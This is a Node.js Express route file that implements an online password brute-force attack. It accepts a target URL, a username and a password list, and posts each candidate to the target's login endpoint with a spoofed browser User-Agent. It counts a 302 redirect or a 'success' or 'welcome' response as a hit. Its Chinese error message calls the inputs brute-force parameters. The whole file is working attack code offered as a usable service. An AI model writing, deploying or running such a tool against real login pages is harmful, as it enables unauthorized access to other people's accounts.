const express = require('express')
const router = express.Router()
const axios = require('axios')

router.post('/password', async (req, res) => {
  const { url, username, passwords } = req.body
  
  if (!url || !username || !passwords || passwords.length === 0) {
    return res.status(400).json({ error: '请提供完整的爆破参数' })
  }
  
  let found = false
  let foundPassword = null
  const tried = []
  
  for (const password of passwords) {
    tried.push(password)
    
    try {
      const response = await axios.post(url, {
        username,
        password
      }, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        timeout: 5000,
        maxRedirects: 0,
        validateStatus: () => true
      })
      
      if (response.status === 302 || response.data.includes('成功') || response.data.includes('welcome')) {
        found = true
        foundPassword = password
        break
      }
    } catch (error) {
      continue
    }
  }
  
  res.json({
    success: true,
    found,
    password: foundPassword,
    triedCount: tried.length,
    triedPasswords: tried.slice(0, 20)
  })
})

module.exports = router